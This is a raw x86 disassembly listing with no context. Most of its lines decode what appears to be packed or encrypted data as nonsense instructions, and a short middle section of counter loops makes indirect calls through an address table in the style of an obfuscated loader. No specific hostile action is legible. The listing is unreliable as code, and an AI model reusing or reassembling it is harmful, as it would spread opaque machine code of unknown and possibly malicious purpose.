  40a9d1:	or     DWORD PTR [edx],ebp
  40a9d3:	add    DWORD PTR [esi+0x2a],ebx
  40a9d6:	std    
  40a9d7:	pop    ds
  40a9d8:	add    al,0x5a
  40a9da:	(bad)  
  40a9db:	fwait
  40a9dc:	pusha  
  40a9dd:	add    edi,DWORD PTR [eax]
  40a9df:	mov    bl,0x45
  40a9e1:	enter  0xdfb,0x17
  40a9e5:	xchg   edi,eax
  40a9e6:	push   ebx
  40a9e7:	rcr    esi,cl
  40a9e9:	pop    eax
  40a9ea:	rol    BYTE PTR [ebx],1
  40a9ec:	xchg   ebp,eax
  40a9ed:	dec    edx
  40a9ee:	sub    ebx,DWORD PTR [edx]
  40a9f0:	and    esp,DWORD PTR [esi]
  40a9f2:	jle    0x40aa07
  40a9f4:	mov    ds:0xa07e3df6,al
  40a9f9:	xchg   edi,eax
  40a9fa:	inc    ecx
  40a9fb:	shr    edx,0x71
  40a9fe:	lahf   
  40a9ff:	mov    edx,0x49b38da2
  40aa04:	mov    bh,0x57
  40aa06:	(bad)
  40aa0a:	and    ebp,DWORD PTR [ebx+0x3a248480]
  40aa10:	icebp  
  40aa11:	add    edx,esi
  40aa13:	push   ds
  40aa14:	js     0x40aa5b
  40aa16:	rol    BYTE PTR [eax],0x8d
  40aa19:	or     esp,DWORD PTR [edi+0x1c]
  40aa1c:	inc    eax
  40aa1d:	xchg   esp,eax
  40aa1e:	cmp    esi,esi
  40aa20:	inc    BYTE PTR [ebp-0x7349f31f]
  40aa26:	cdq    
  40aa27:	xlat   BYTE PTR ds:[ebx]
  40aa28:	or     al,0x64
  40aa2a:	arpl   WORD PTR [edx-0x1f],di
  40aa2d:	addr16 xchg ebx,eax
  40aa2f:	push   ecx
  40aa30:	or     esp,DWORD PTR [edi-0x276455e]
  40aa36:	sbb    BYTE PTR [eax-0x6e4737b6],al
  40aa3c:	push   0xfa18aea7
  40aa41:	pusha  
  40aa42:	fimul  WORD PTR [edx-0x28]
  40aa45:	sub    ecx,DWORD PTR [esi+0x3c]
  40aa48:	mov    eax,DWORD PTR [ebx-0x56]
  40aa4b:	scas   eax,DWORD PTR es:[edi]
  40aa4c:	push   0xffffffee
  40aa4e:	push   esi
  40aa4f:	mov    ch,0x6e
  40aa51:	push   esi
  40aa52:	sti    
  40aa53:	aam    0xa7
  40aa55:	lahf   
  40aa56:	mov    bh,0x47
  40aa58:	push   ebp
  40aa59:	jecxz  0x40aad6
  40aa5b:	xchg   ecx,eax
  40aa5c:	test   DWORD PTR [esi+0x59],0xb6515b1d
  40aa63:	mov    ebx,0x21f006e8
  40aa68:	test   esi,ebp
  40aa6a:	cmp    BYTE PTR [ebx],ch
  40aa6c:	dec    ecx
  40aa6d:	adc    DWORD PTR [ebp-0x4a],esp
  40aa70:	xchg   ecx,eax
  40aa71:	inc    esp
  40aa72:	pushf  
  40aa73:	or     ecx,0xd31a3114
  40aa79:	sub    al,0xfb
  40aa7b:	test   eax,0x34155c4a
  40aa80:	jne    0x40aa4c
  40aa82:	sbb    DWORD PTR [ebx],ecx
  40aa84:	xor    dh,dh
  40aa86:	sar    DWORD PTR [ecx-0x10],1
  40aa89:	test   eax,0x2b2ae162
  40aa8e:	shr    DWORD PTR [edi-0x69],1
  40aa91:	es push es
  40aa93:	or     al,0x64
  40aa95:	jg     0x40aac3
  40aa97:	cmp    eax,0x1c55cd18
  40aa9c:	mov    bh,0x46
  40aa9e:	xor    al,0xb7
  40aaa0:	cld    
  40aaa1:	pop    ebx
  40aaa2:	shl    cl,1
  40aaa4:	pop    es
  40aaa5:	shl    BYTE PTR [ecx-0x30],0x63
  40aaa9:	out    0x32,al
  40aaab:	gs lahf 
  40aaad:	pop    eax
  40aaae:	or     DWORD PTR [eax-0x67],edi
  40aab1:	push   esi
  40aab2:	out    dx,al
  40aab3:	outs   dx,DWORD PTR ds:[esi]
  40aab4:	out    dx,al
  40aab5:	imul   ebx,DWORD PTR [ebx-0xc],0xc
  40aab9:	or     DWORD PTR [ebx+0x74a56a4d],edi
  40aabf:	or     esp,esp
  40aac1:	adc    eax,0xd5390972
  40aac6:	push   eax
  40aac7:	rcl    DWORD PTR ds:0xf7ae7223,0x54
  40aace:	xchg   BYTE PTR [ecx-0x1a],dl
  40aad1:	sti    
  40aad2:	cmp    eax,0x1a93fbc
  40aad7:	es mov ebp,0xe31a7662
  40aadd:	jge    0x40ab2c
  40aadf:	mov    esi,0xe6278996
  40aae4:	mov    ds:0xca9571b3,al
  40aae9:	inc    ebx
  40aaea:	fld    QWORD PTR [esi+ebx*2+0x46]
  40aaee:	or     BYTE PTR [ebx+0x7c],bl
  40aaf1:	outs   dx,DWORD PTR ds:[esi]
  40aaf2:	or     ch,BYTE PTR [ebp-0x36]
  40aaf5:	rcl    DWORD PTR [edi+esi*8+0x62],1
  40aaf9:	in     al,0x4b
  40aafb:	xor    DWORD PTR ds:0x800ec4bf,0xc8dcca74
  40ab05:	cmp    al,dl
  40ab07:	inc    edx
  40ab08:	scas   al,BYTE PTR es:[edi]
  40ab09:	data16 sbb al,0xd7
  40ab0c:	aaa    
  40ab0d:	xor    DWORD PTR [ebx],edi
  40ab0f:	fbstp  TBYTE PTR [esi+0x30132644]
  40ab15:	push   ebx
  40ab16:	dec    eax
  40ab17:	push   ebp
  40ab18:	mov    ebx,0xd85ed1e2
  40ab1d:	jae    0x40ab4e
  40ab1f:	sub    ah,BYTE PTR [edi]
  40ab21:	push   esi
  40ab22:	pop    ebp
  40ab23:	pop    edx
  40ab24:	in     eax,0xad
  40ab26:	sbb    eax,0xd00fb938
  40ab2c:	mov    WORD PTR [ecx],es
  40ab2e:	arpl   WORD PTR [ebp-0x25],si
  40ab31:	sub    ebx,ebx
  40ab33:	data16 out dx,al
  40ab35:	in     al,dx
  40ab36:	inc    edi
  40ab37:	or     al,0x26
  40ab39:	loopne 0x40aba3
  40ab3b:	in     al,dx
  40ab3c:	add    al,0x77
  40ab3e:	lock aas 
  40ab40:	arpl   WORD PTR [esi+0x7745014f],si
  40ab46:	in     eax,0xbb
  40ab48:	or     eax,DWORD PTR [ebx]
  40ab4a:	mov    dl,0x29
  40ab4c:	daa    
  40ab4d:	(bad)  
  40ab4e:	fbstp  TBYTE PTR [ebp+0x34269b57]
  40ab54:	and    BYTE PTR [esi-0x14],cl
  40ab57:	push   ebp
  40ab58:	call   0xe5c86e46
  40ab5d:	xchg   ebp,eax
  40ab5e:	idiv   bh
  40ab60:	jbe    0x40abb2
  40ab62:	(bad)  
  40ab63:	mov    gs,WORD PTR [eax+ebx*1+0x40cafddb]
  40ab6a:	mov    al,0xf0
  40ab6c:	test   al,0x90
  40ab6e:	rol    eax,cl
  40ab70:	daa    
  40ab71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab72:	ja     0x40abb4
  40ab74:	clc    
  40ab75:	jmp    0x40ab65
  40ab77:	push   eax
  40ab78:	dec    edx
  40ab79:	bound  ecx,QWORD PTR [ebp+esi*2-0x74d1b8b]
  40ab80:	sbb    eax,0x82644063
  40ab85:	adc    BYTE PTR [edx-0x2e86e198],ch
  40ab8b:	jbe    0x40abd5
  40ab8d:	clc    
  40ab8e:	ret    0x9965
  40ab91:	push   edi
  40ab92:	stc    
  40ab93:	stc    
  40ab94:	inc    edx
  40ab95:	mov    ebx,0x74a89624
  40ab9a:	mov    ebx,0xc4a9ac90
  40ab9f:	fwait
  40aba0:	mul    al
  40aba2:	int3   
  40aba3:	inc    eax
  40aba4:	mov    ebp,0x455c3938
  40aba9:	push   eax
  40abaa:	stos   BYTE PTR es:[edi],al
  40abab:	dec    ebx
  40abac:	pop    ss
  40abad:	and    eax,0x327edb4c
  40abb2:	bound  esi,QWORD PTR [ebx]
  40abb4:	xor    BYTE PTR [esi],dl
  40abb6:	cmp    dh,BYTE PTR [edi]
  40abb8:	mov    ds:0xe97495a0,eax
  40abbd:	inc    edi
  40abbe:	mov    bh,0xe9
  40abc0:	daa    
  40abc1:	mov    esi,0x943e2dad
  40abc6:	push   0x911f9460
  40abcb:	cwde   
  40abcc:	push   ds
  40abcd:	dec    ecx
  40abce:	mov    ebx,0xb1292512
  40abd3:	rcr    dh,cl
  40abd5:	shl    BYTE PTR [ecx],cl
  40abd7:	adc    eax,0x20b5d637
  40abdc:	pop    edi
  40abdd:	add    edx,DWORD PTR [edx]
  40abdf:	test   eax,0xc3ba390c
  40abe4:	mov    esi,0x58874e5d
  40abe9:	outs   dx,DWORD PTR ds:[esi]
  40abea:	push   ss
  40abeb:	dec    eax
  40abec:	imul   edx,esi,0x58e48a7c
  40abf2:	loope  0x40ac43
  40abf4:	jnp    0x40abad
  40abf6:	mov    al,ds:0x6d089f5d
  40abfb:	cmp    bh,dh
  40abfd:	and    DWORD PTR [ecx-0x7e2fccfb],edi
  40ac03:	xor    eax,0x42fcf5
  40ac08:	movntq QWORD PTR [edx+0x0],mm0
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e703,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fcdd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fd7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fcf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e6f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e6f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e23d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e2f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e6f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e6f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e128,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e128
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e128,ebx
  40acad:	cmp    DWORD PTR ds:0x42e128,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e128,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e2f7
  40acd5:	cmp    DWORD PTR ds:0x42e128,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e128
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e128,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e134
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fce1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fce1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fce1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd01
  40ad3c:	call   DWORD PTR ds:0x42e54b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fce1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fce1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40adf7
  40adb4:	in     eax,dx
  40adb5:	retf   
  40adb6:	enter  0xfd03,0x70
  40adba:	jo     0x40ad5b
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad5a
  40adc0:	loope  0x40adc7
  40adc2:	scas   al,BYTE PTR es:[edi]
  40adc3:	aam    0xab
  40adc5:	lds    edi,FWORD PTR [eax+eax*1-0xee4e423]
  40adcc:	dec    ecx
  40adcd:	aas    
  40adce:	in     al,dx
  40adcf:	inc    ebx
  40add0:	push   eax
  40add1:	push   ds
  40add2:	mov    ecx,0xf04c43cb
  40add7:	inc    esp
  40add8:	sub    ah,BYTE PTR [edi+0xbcef961]
  40adde:	jo     0x40ae37
  40ade0:	retf   0xa2f0
  40ade3:	push   ebx
  40ade4:	push   0x72
  40ade6:	dec    esi
  40ade7:	stos   BYTE PTR es:[edi],al
  40ade8:	cbw    
  40adea:	xchg   esi,eax
  40adeb:	in     eax,dx
  40adec:	or     edi,DWORD PTR [edx+esi*4+0x2c14885e]
  40adf3:	mov    ebp,0x72b91139
  40adf8:	cmp    edx,DWORD PTR [edx-0x7bf0e032]
  40adfe:	and    DWORD PTR [ebx-0x23506489],0x3730c147
  40ae08:	popa   
  40ae09:	fisub  WORD PTR [ecx]
  40ae0b:	fst    QWORD PTR [ebx]
  40ae0d:	shr    BYTE PTR [edx+0x47],cl
  40ae10:	int    0x42
  40ae12:	into   
  40ae13:	ds in  eax,dx
  40ae15:	adc    BYTE PTR [ebx-0x7547e87a],0x45
  40ae1c:	ret    0x565
  40ae1f:	aam    0x1f
  40ae21:	cmp    eax,0xe899a3ef
  40ae26:	xor    eax,0x4304a7ae
  40ae2b:	js     0x40aea2
  40ae2d:	mov    edi,0xb0b2a080
  40ae32:	jecxz  0x40ae2a
  40ae34:	sbb    al,BYTE PTR [eax]
  40ae36:	push   ebp
  40ae37:	sar    BYTE PTR [ebx-0xfb87a4c],0x31
  40ae3e:	adc    eax,0x5ab933c8
  40ae43:	cmp    eax,0x2a7df61d
  40ae48:	inc    ebx
  40ae49:	sub    ch,BYTE PTR [edi+0x456337cc]
  40ae4f:	mov    al,al
  40ae51:	cmp    ebp,DWORD PTR ds:0x68eeebd4
  40ae57:	daa    
  40ae58:	popa   
  40ae59:	in     eax,0x75
  40ae5b:	sbb    eax,DWORD PTR [edx-0x779a331d]
  40ae61:	cs mov al,0x2a
  40ae64:	scas   al,BYTE PTR es:[edi]
  40ae65:	xchg   edx,eax
  40ae66:	xor    eax,0xc4a23791
  40ae6b:	mov    bh,BYTE PTR [esi+0xebf369]
  40ae71:	fimul  DWORD PTR [eax]
  40ae73:	adc    ch,BYTE PTR [edi+0x1c3357f0]
  40ae79:	icebp  
  40ae7a:	xchg   esp,eax
  40ae7b:	icebp  
  40ae7c:	and    eax,DWORD PTR [ebp+0x7f]
  40ae7f:	or     edx,ebp
  40ae81:	jecxz  0x40aec3
  40ae83:	sbb    edi,DWORD PTR [edi+esi*8-0x11375612]
  40ae8a:	fwait
  40ae8b:	call   0x8f29:0xe98413f6
  40ae92:	adc    dh,al
  40ae94:	xchg   esp,eax
  40ae95:	nop
  40ae96:	sar    BYTE PTR [ecx-0x4c29e72],0x43
  40ae9d:	jmp    0x40aefd
  40ae9f:	pop    edx
  40aea0:	test   BYTE PTR [ebx],ch
  40aea2:	xor    al,0xe8
  40aea4:	adc    al,dl
  40aea6:	sbb    BYTE PTR [eax],bl
  40aea8:	inc    edi
  40aea9:	lods   al,BYTE PTR ds:[esi]
  40aeaa:	adc    bh,ch
  40aeac:	pop    edx
  40aead:	sub    eax,0xa6422dbe
  40aeb2:	(bad)  [ebp+0x2f]
  40aeb5:	and    ch,BYTE PTR [edi+ebx*8-0x5f]
  40aeb9:	add    eax,0x3c571053
  40aebe:	dec    esp
  40aebf:	push   edx
  40aec0:	pop    eax
  40aec1:	jle    0x40aeee
  40aec3:	fldenv [ebx-0x8229e46]
  40aec9:	loope  0x40af21
  40aecb:	in     eax,dx
  40aecc:	(bad)  
  40aecd:	pop    ds
  40aece:	adc    edx,ebx
  40aed0:	jg     0x40aeff
  40aed2:	and    BYTE PTR [ecx-0x60],cl
  40aed5:	ins    DWORD PTR es:[edi],dx
  40aed6:	add    eax,esp
  40aed8:	aad    0xab
  40aeda:	rcl    BYTE PTR [ecx-0x1a1cea04],1
  40aee0:	clc    
  40aee1:	mov    dl,0x7a
  40aee3:	outs   dx,BYTE PTR ds:[esi]
  40aee4:	and    ch,dl
  40aee6:	into   
  40aee7:	hlt    
  40aee8:	ins    DWORD PTR es:[edi],dx
  40aee9:	jo     0x40aea3
  40aeeb:	add    al,0x2e
  40aeed:	sub    al,BYTE PTR [eax+0x392dc64b]
  40aef3:	js     0x7187301a
  40aef9:	xchg   ebp,eax
  40aefa:	sub    ebx,DWORD PTR [ecx]
  40aefc:	lods   al,BYTE PTR ds:[esi]
  40aefd:	pop    ebx
  40aefe:	shr    bh,cl
  40af00:	test   eax,0xc3742301
  40af05:	add    DWORD PTR [ebp-0x3d],0xffffffe0
  40af09:	lods   al,BYTE PTR ds:[esi]
  40af0a:	ds and eax,0xcb3833b1
  40af10:	xchg   ebp,eax
  40af11:	xor    BYTE PTR [ebx+edx*2-0xb],al
  40af15:	jb     0x40af2d
  40af17:	enter  0xf396,0xb9
  40af1b:	sub    dh,BYTE PTR [edx+0x3aaae05e]
  40af21:	mov    esp,ebx
  40af23:	jmp    0x350f6ed6
  40af28:	(bad)  [edx]
  40af2a:	jo     0x40af9e
  40af2c:	arpl   WORD PTR [esi+0x3959a64],ax
  40af32:	push   esp
  40af33:	mov    WORD PTR [ebx],ds
  40af35:	lds    edi,FWORD PTR [ebp+ecx*4+0x35]
  40af39:	pushf  
  40af3a:	pop    ebp
  40af3b:	cmp    esp,ebx
  40af3d:	pusha  
  40af3e:	scas   al,BYTE PTR es:[edi]
  40af3f:	pop    ss
  40af40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af41:	sbb    eax,0xfebb29f8
  40af46:	adc    BYTE PTR [edi],bl
  40af48:	xchg   esp,eax
  40af49:	adc    bl,al
  40af4b:	push   cs
  40af4c:	mov    bl,0x55
  40af4e:	sbb    dh,bh
  40af50:	sbb    eax,0x19d0da4f
  40af55:	push   edi
  40af56:	add    ebp,DWORD PTR [esi-0x64]
  40af59:	imul   DWORD PTR [ebx]
  40af5b:	lods   eax,DWORD PTR ds:[esi]
  40af5c:	push   0xffffffcf
  40af5e:	sbb    eax,0xe71c7e06
  40af63:	das    
  40af64:	mov    ebp,DWORD PTR [eax+ebx*8-0x36]
  40af68:	pop    eax
  40af69:	push   0x73706db0
  40af6e:	retf   
  40af6f:	pop    es
  40af70:	jge    0x40af20
  40af72:	cmp    al,0xa8
  40af74:	int    0x56
  40af76:	icebp  
  40af77:	dec    ecx
  40af78:	popf   
  40af79:	jge    0x40afb7
  40af7b:	daa    
  40af7c:	cmp    ah,BYTE PTR [esp+eiz*2+0x62]
  40af80:	aaa    
  40af81:	call   0x6742:0x33f4b1ec
  40af88:	ror    DWORD PTR [eax-0x63],cl
  40af8b:	repz add DWORD PTR [ecx+0x76],eax
  40af8f:	cdq    
  40af90:	dec    ecx
  40af91:	mov    edi,0x460ceff2
  40af96:	add    eax,0xf5adda5c
  40af9b:	add    DWORD PTR [ecx+ebp*1],esi
  40af9e:	fld    st(2)
  40afa0:	loop   0x40afcf
  40afa2:	aaa    
  40afa3:	shl    BYTE PTR [edi+0x121ae87f],1
  40afa9:	test   eax,0xc4efd3af
  40afae:	mov    al,ds:0x32ba05ef
  40afb3:	ins    BYTE PTR es:[edi],dx
  40afb4:	shl    BYTE PTR [esp+esi*2],0xda
  40afb8:	mov    ebx,0x65e1cf0b
  40afbd:	lea    ebx,[esi-0x52e3776f]
  40afc3:	fild   QWORD PTR [esi]
  40afc5:	ror    DWORD PTR [esi+ebp*8+0x12f03355],1
  40afcc:	and    BYTE PTR [edx+ecx*8+0x4462b73e],al
  40afd3:	test   BYTE PTR [edx],dh
  40afd5:	jl     0x40affa
  40afd7:	dec    esp
  40afd8:	and    esi,DWORD PTR [esi+0x25]
  40afdb:	int3   
  40afdc:	add    ah,BYTE PTR [ebx+0x1]
  40afdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afe0:	popa   
  40afe1:	inc    esp
  40afe2:	or     al,0x47
  40afe4:	push   edi
  40afe5:	popf   
  40afe6:	test   DWORD PTR [edx],esi
  40afe8:	arpl   cx,cx
  40afea:	push   esi
  40afeb:	pop    edx
  40afec:	jno    0x40afd7
  40afee:	pop    esi
  40afef:	in     al,dx
  40aff0:	lds    esp,FWORD PTR [ebx+0xf]
  40aff3:	mov    ch,dh
  40aff5:	ret    0x38cb
  40aff8:	mov    WORD PTR [ecx],cs
  40affa:	arpl   WORD PTR [edi-0x76],dx
  40affd:	and    eax,0x63ef34ca
  40b002:	rol    BYTE PTR ds:0x62ea4d0e,1
  40b008:	jge    0x40b026
  40b00a:	sub    BYTE PTR [esi],0x51
  40b00d:	pop    edx
  40b00e:	pop    ebp
  40b00f:	pop    ss
  40b010:	sub    al,0xf0
  40b012:	mov    ebx,0x75a608cc
  40b017:	mov    DWORD PTR [ebx],eax
  40b019:	add    DWORD PTR [ebx],ecx
  40b01b:	mov    esi,0x43cf5a63
  40b020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b021:	push   0x26ee89eb
  40b026:	pop    esp
  40b027:	pop    ebp
  40b028:	retf   0x942b
  40b02b:	ins    DWORD PTR es:[edi],dx
  40b02c:	mov    esp,0xd62c7a23
  40b031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b032:	sub    eax,0x7b9d7abe
  40b037:	sbb    eax,0x872a781b
  40b03c:	jl     0x40afd3
  40b03e:	mov    esi,0x186cc75a
  40b043:	xchg   edi,eax
  40b044:	inc    ebx
  40b045:	mov    bl,0xe7
  40b047:	leave  
  40b048:	out    0x2,eax
  40b04a:	jb     0x40b031
  40b04c:	mov    bh,0x85
  40b04e:	aad    0x0
  40b050:	xchg   edx,eax
  40b051:	shl    edi,cl
  40b053:	xor    al,0xfe
  40b055:	jl     0x40b0cb
  40b057:	inc    esp
  40b058:	imul   edi,DWORD PTR [edx],0x3700a1d8
  40b05e:	add    dh,BYTE PTR [ecx+0x7e2d0b96]
  40b064:	push   esi
  40b065:	pop    ecx
  40b066:	cmp    eax,edx
  40b068:	xchg   edi,eax
  40b069:	adc    edx,ebp
  40b06b:	retf   
  40b06c:	mov    edi,0x18960e23
  40b071:	push   edi
  40b072:	push   ebx
  40b073:	dec    esp
  40b074:	sti    
  40b075:	jmp    0x40b02b
  40b077:	int3   
  40b078:	or     BYTE PTR [eax+0x6d49f560],ah
  40b07e:	cmp    dl,BYTE PTR [edi-0x3]
  40b081:	outs   dx,BYTE PTR ds:[esi]
  40b082:	sbb    al,0x1c
  40b084:	aad    0xa3
  40b086:	cmp    esi,DWORD PTR [ecx+ebx*4+0x45276f8d]
  40b08d:	push   ds
  40b08e:	fistp  QWORD PTR [eax+0x37]
  40b091:	mov    esi,fs
  40b093:	cmp    ecx,esp
  40b095:	fcomp  QWORD PTR [ebx-0x14]
  40b098:	loop   0x40b0a9
  40b09a:	nop
  40b09b:	js     0x40b04a
  40b09d:	mov    dh,0xaf
  40b09f:	add    ah,BYTE PTR [edi]
  40b0a1:	mov    ebx,0x131d3afd
  40b0a6:	adc    BYTE PTR [edi+ebp*4+0x427db529],dl
  40b0ad:	popf   
  40b0ae:	jbe    0x40b062
  40b0b0:	xor    DWORD PTR [edi],0xffffffc6
  40b0b3:	jns    0x40b113
  40b0b5:	cmp    BYTE PTR [edi-0x74],dl
  40b0b8:	fdivr  QWORD PTR [edi]
  40b0ba:	push   esi
  40b0bc:	popa   
  40b0bd:	adc    BYTE PTR [eax-0x6355d17],bl
  40b0c3:	(bad)  [eax]
  40b0c5:	sub    ebp,edx
  40b0c7:	push   ss
  40b0c8:	jbe    0x40b0d3
  40b0ca:	and    DWORD PTR ds:0x9ff3cc29,0xb
  40b0d1:	mov    ebx,0x36c4d0a6
  40b0d6:	test   eax,0xf2522039
  40b0db:	je     0x40b0bc
  40b0dd:	cwde   
  40b0de:	mov    ah,0x4a
  40b0e0:	in     al,0xd9
  40b0e2:	inc    ebp
  40b0e3:	adc    al,0xac
  40b0e5:	shl    DWORD PTR [ecx-0x61],cl
  40b0e8:	xor    DWORD PTR [ebp+edx*4-0x5c32619a],edx
  40b0ef:	aad    0xa1
  40b0f1:	adc    BYTE PTR ds:0x8bccd53d,dh
  40b0f7:	dec    edi
  40b0f8:	and    BYTE PTR [edx-0x24],cl
  40b0fb:	ds mov bh,0x34
  40b0fe:	les    ecx,FWORD PTR [esi-0x5ef37c10]
  40b104:	cli    
  40b105:	out    dx,eax
  40b106:	jnp    0x40b12c
  40b108:	rol    DWORD PTR [ecx-0x53e5df2c],1
  40b10e:	daa    
  40b10f:	or     esp,ebp
  40b111:	stos   BYTE PTR es:[edi],al
  40b112:	out    0x97,eax
  40b114:	xor    al,0xf0
  40b116:	mov    cl,0xeb
  40b118:	aam    0x4
  40b11a:	mov    eax,0xd445673b
  40b11f:	out    0xeb,eax
  40b121:	retf   0x94c1
  40b124:	(bad)  
  40b125:	mov    eax,ds:0xbad45ad3
  40b12a:	pop    ecx
  40b12b:	ror    DWORD PTR [esi],0x9c
  40b12e:	out    dx,al
  40b12f:	ror    DWORD PTR ds:0xf65501ce,1
  40b135:	pop    es
  40b136:	inc    ebp
  40b137:	into   
  40b138:	loope  0x40b110
  40b13a:	rcl    DWORD PTR [esi-0x2a],0xc2
  40b13e:	clc    
  40b13f:	stos   BYTE PTR es:[edi],al
  40b140:	es push eax
  40b142:	repz leave 
  40b144:	gs mov cl,0x61
  40b147:	xor    esi,DWORD PTR [edi]
  40b149:	sbb    al,0x6a
  40b14b:	icebp  
  40b14c:	sbb    eax,0x1667435b
  40b151:	ror    bh,0x25
  40b154:	push   esp
  40b155:	add    BYTE PTR [edx],0x7e
  40b158:	pop    edi
  40b159:	mov    edx,0x1c1e2330
  40b15e:	mov    al,0x29
  40b160:	add    edx,ecx
  40b162:	jmp    0x40b520
  40b167:	shl    BYTE PTR [ebp+0x37],cl
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	das    
  40b174:	fbld   TBYTE PTR [ebx+0x70faa2fe]
  40b17a:	jo     0x40b11b
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b161
  40b180:	dec    bl
  40b182:	mov    eax,ds:0xa9fc022d
  40b187:	dec    eax
  40b188:	mov    ebp,0x55e57522
  40b18d:	adc    eax,0x516fa0e8
  40b192:	xor    esi,DWORD PTR [eax]
  40b194:	in     eax,dx
  40b195:	sahf   
  40b196:	stos   BYTE PTR es:[edi],al
  40b197:	pushw  0xbf9a
  40b19b:	pop    esp
  40b19c:	xchg   ecx,eax
  40b19d:	fsubr  st,st(7)
  40b19f:	mov    ds,esp
  40b1a1:	inc    ebx
  40b1a2:	sub    DWORD PTR [ecx],0x62617113
  40b1a8:	jnp    0x40b16a
  40b1aa:	and    al,BYTE PTR [ecx-0x3e]
  40b1ad:	imul   ebp,esi,0xab5e097d
  40b1b3:	mov    ebp,0xf83d66e5
  40b1b8:	or     DWORD PTR [eax+0x15],ecx
  40b1bb:	ret    0x7675
  40b1be:	mov    edx,0xa04917a1
  40b1c3:	enter  0xc47c,0x55
  40b1c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1c8:	jmp    0x2c4ee297
  40b1cd:	add    al,0x55
  40b1cf:	ins    BYTE PTR es:[edi],dx
  40b1d0:	(bad)  
  40b1d2:	ret    0x5ffa
  40b1d5:	and    edi,DWORD PTR [esi-0x7af8d8fe]
  40b1db:	cmp    al,0xa5
  40b1dd:	dec    esp
  40b1de:	adc    BYTE PTR [esi-0x18dbc945],al
  40b1e4:	not    bl
  40b1e6:	inc    ebx
  40b1e7:	aas    
  40b1e8:	cwde   
  40b1e9:	lods   eax,DWORD PTR ds:[esi]
  40b1ea:	imul   edx,edi,0xd3525633
  40b1f0:	aas    
  40b1f1:	ss inc edx
  40b1f3:	xor    dh,cl
  40b1f5:	xchg   ecx,eax
  40b1f6:	js     0x40b204
  40b1f8:	inc    ebx
  40b1f9:	cmp    ch,BYTE PTR [eax]
